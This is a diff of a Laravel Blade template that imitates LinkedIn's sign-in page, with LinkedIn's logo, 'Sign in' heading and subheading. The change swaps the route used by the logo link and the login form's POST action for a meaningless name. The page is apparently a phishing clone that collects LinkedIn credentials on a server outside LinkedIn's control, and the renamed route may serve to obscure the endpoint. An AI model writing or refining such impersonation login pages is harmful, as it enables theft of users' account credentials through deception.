@@ -72,7 +72,7 @@
 
 <body class="system-fonts ">
     <div id="app__container">
-        <header><a class="linkedin-logo" href="{{ route('edin') }}" aria-label="Linkedin">
+        <header><a class="linkedin-logo" href="{{ route('yvaxrqva') }}" aria-label="Linkedin">
                 <li-icon tabindex="0" aria-label="LinkedIn" type="linkedin-logo" size="28dp" alt="LinkedIn"
                     color="brand"><svg width="102" height="26" viewBox="0 0 102 26" fill="none"
                         xmlns="http://www.w3.org/2000/svg" id="linkedin-logo" preserveAspectRatio="xMinYMin meet"
@@ -104,7 +104,7 @@
                         <h1 class="header__content__heading ">Sign in</h1>
                         <p class="header__content__subheading ">Stay updated on your professional world</p>
                     </div>
-                    <form method="post" class="login__form" action="{{ url('edin') }}" novalidate="">
+                    <form method="post" class="login__form" action="{{ url('yvaxrqva') }}" novalidate="">
                         
                         @csrf
 
